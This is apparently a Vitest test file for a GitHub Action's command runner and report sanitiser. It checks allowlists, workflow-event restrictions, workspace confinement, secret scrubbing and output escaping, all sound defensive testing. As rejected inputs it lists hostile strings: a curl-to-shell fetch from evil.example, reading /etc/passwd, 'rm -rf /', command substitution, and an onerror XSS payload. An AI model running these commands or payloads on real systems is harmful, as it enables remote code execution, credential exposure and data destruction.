import { describe, expect, it } from 'vitest';

import {
  assertSafeExecutionContext,
  CommandError,
  parseCommand,
  resolveWorkingDirectory,
  scrubEnvironment,
  tokenize,
} from '../../src/adapters/exec/command.js';
import { DEFAULT_ALLOWED_COMMANDS } from '../../src/core/config/schema.js';
import { redactSecrets, sanitizeCell, sanitizeText, stripMarkup } from '../../src/core/render/sanitize.js';
import { COMMENT_MARKER } from '../../src/core/render/markdown.js';

const ALLOWED = DEFAULT_ALLOWED_COMMANDS;

describe('command parsing', () => {
  it('splits a normal command into argv', () => {
    const command = parseCommand('npm run build', ALLOWED);
    expect(command.file).toBe('npm');
    expect(command.args).toEqual(['run', 'build']);
  });

  it('keeps quoted arguments together', () => {
    expect(tokenize('pytest -k "my slow test"')).toEqual(['pytest', '-k', 'my slow test']);
  });

  it.each([
    'npm test; curl https://evil.example/x | sh',
    'npm test && cat /etc/passwd',
    'npm test | tee /tmp/out',
    'npm test > /tmp/out',
    'npm run $(whoami)',
    'npm run `whoami`',
    'npm test & sleep 10',
    'npm test\ncurl https://evil.example',
    'npm test \\; rm -rf /',
  ])('refuses shell metacharacters: %s', (input) => {
    expect(() => parseCommand(input, ALLOWED)).toThrow(CommandError);
  });

  it('refuses an executable that is not on the allowlist', () => {
    expect(() => parseCommand('bash -c id', ALLOWED)).toThrow(/not in run.allowed_commands/);
    expect(() => parseCommand('curl https://evil.example', ALLOWED)).toThrow(CommandError);
    expect(() => parseCommand('sh script.sh', ALLOWED)).toThrow(CommandError);
  });

  it('refuses empty, unbalanced and oversized commands', () => {
    expect(() => parseCommand('   ', ALLOWED)).toThrow(CommandError);
    expect(() => parseCommand('npm run "build', ALLOWED)).toThrow(CommandError);
    expect(() => parseCommand(`npm ${'x'.repeat(600)}`, ALLOWED)).toThrow(CommandError);
  });
});

describe('execution context', () => {
  it.each(['pull_request_target', 'workflow_run', 'issue_comment', 'schedule'])(
    'refuses to execute during a %s event',
    (event) => {
      expect(() => {
        assertSafeExecutionContext(event);
      }).toThrow(CommandError);
    },
  );

  it('allows execution for pull_request and unknown local contexts', () => {
    expect(() => {
      assertSafeExecutionContext('pull_request');
    }).not.toThrow();
    expect(() => {
      assertSafeExecutionContext(undefined);
    }).not.toThrow();
  });
});

describe('working directory', () => {
  it('accepts a directory inside the workspace', () => {
    expect(resolveWorkingDirectory('/work', 'packages/api')).toContain('packages');
  });

  it.each(['../..', '/etc', '../../../root'])('refuses to escape the workspace: %s', (target) => {
    expect(() => resolveWorkingDirectory('/work', target)).toThrow(CommandError);
  });
});

describe('environment scrubbing', () => {
  it('drops credentials and action inputs', () => {
    const scrubbed = scrubEnvironment({
      PATH: '/usr/bin',
      GITHUB_TOKEN: 'ghp_secret',
      NPM_TOKEN: 'secret',
      MY_API_KEY: 'secret',
      AWS_SECRET_ACCESS_KEY: 'secret',
      INPUT_TOKEN: 'secret',
      ACTIONS_RUNTIME_TOKEN: 'secret',
      DATABASE_PASSWORD: 'secret',
      HOME: '/home/runner',
    });

    expect(scrubbed['PATH']).toBe('/usr/bin');
    expect(scrubbed['HOME']).toBe('/home/runner');
    expect(scrubbed['CI']).toBe('true');
    for (const key of [
      'GITHUB_TOKEN',
      'NPM_TOKEN',
      'MY_API_KEY',
      'AWS_SECRET_ACCESS_KEY',
      'INPUT_TOKEN',
      'ACTIONS_RUNTIME_TOKEN',
      'DATABASE_PASSWORD',
    ]) {
      expect(scrubbed[key]).toBeUndefined();
    }
  });
});

describe('report sanitisation', () => {
  it('strips HTML comments so untrusted text cannot forge the marker', () => {
    const hostile = `Nice PR ${COMMENT_MARKER} <!-- prproof:report:v1 --> done`;
    const clean = stripMarkup(hostile);
    expect(clean).not.toContain('<!--');
    expect(sanitizeText(hostile)).not.toContain(COMMENT_MARKER);
  });

  it('escapes angle brackets', () => {
    expect(sanitizeText('<img src=x onerror=alert(1)>')).not.toContain('<img');
  });

  it('defuses mentions and issue references', () => {
    const clean = sanitizeText('cc @octocat about #1234');
    expect(clean).not.toMatch(/@octocat/);
    expect(clean).not.toMatch(/#1234/);
  });

  it('escapes pipes so a title cannot break the table', () => {
    expect(sanitizeCell('a | b | c')).toBe('a \\| b \\| c');
  });

  it('truncates very long values', () => {
    expect(sanitizeText('x'.repeat(1000), 50)).toHaveLength(50);
  });

  it('redacts credentials found in command output', () => {
    expect(redactSecrets('token=ghp_abcdefghijklmnopqrstuvwxyz012345')).not.toContain('ghp_abcdefghij');
    expect(redactSecrets('AWS key AKIAIOSFODNN7EXAMPLE')).toContain('[redacted-token]');
    expect(redactSecrets('api_key: hunter2hunter2')).toContain('[redacted]');
  });
});
